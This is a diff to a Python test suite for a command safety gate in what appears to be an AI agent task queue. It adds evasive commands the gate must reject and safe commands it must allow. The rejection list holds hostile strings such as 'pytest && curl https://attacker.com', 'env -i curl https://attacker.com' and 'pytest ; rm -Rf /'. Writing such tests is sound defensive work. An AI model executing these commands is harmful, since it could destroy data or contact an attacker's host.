@@ -195,8 +195,11 @@ def test_safety_gate_catches_command_evasions(
         "rm -Rf /tmp/data",
         "sudo rm something",
         "pytest && curl https://attacker.com",
+        "pytest & curl https://attacker.com",
+        "pytest;curl",
         "pytest ; rm -Rf /",
         "env curl https://attacker.com",
+        "env -i curl https://attacker.com",
         "nohup rm -Rf /",
     ]
 
@@ -211,6 +214,36 @@ def test_safety_gate_catches_command_evasions(
         verdict = safety_gate.review_task(task_id, temp_queue)
         assert verdict.passed is False, f"Command '{cmd}' should have been rejected."
         assert temp_queue.get_task(task_id)["status"] == TriageStatus.REJECTED.value
+
+
+def test_safety_gate_permits_safe_quoted_and_argument_commands(
+    temp_queue: TaskTriageQueue, safety_gate: SafetyGate
+) -> None:
+    """Proves that safe commands containing semicolons in quotes, or arguments named like binaries, are NOT blocked."""
+    producer = EvaQueueProducer(queue=temp_queue)
+
+    safe_commands = [
+        'git commit -m "Refactor logic; fix bugs"',
+        'echo "<html>"',
+        "cat curl",
+        "git add rm",
+        "rm --interactive file.txt",
+        "rm --dir my_folder",
+    ]
+
+    for cmd in safe_commands:
+        spec = create_mock_spec(commands=[cmd])
+        task_id, _, _ = producer.enqueue_specification(
+            spec=spec,
+            project_id="proj_safe_cmd",
+            meeting_id="room_1",
+            transcript_excerpt=f"Run safe command {cmd}",
+        )
+        verdict = safety_gate.review_task(task_id, temp_queue)
+        assert verdict.passed is True, (
+            f"Safe command '{cmd}' was falsely rejected: {verdict.reason}"
+        )
+        assert temp_queue.get_task(task_id)["status"] == TriageStatus.APPROVED.value
 
 
 def test_safety_gate_catches_deep_adversarial_injection(
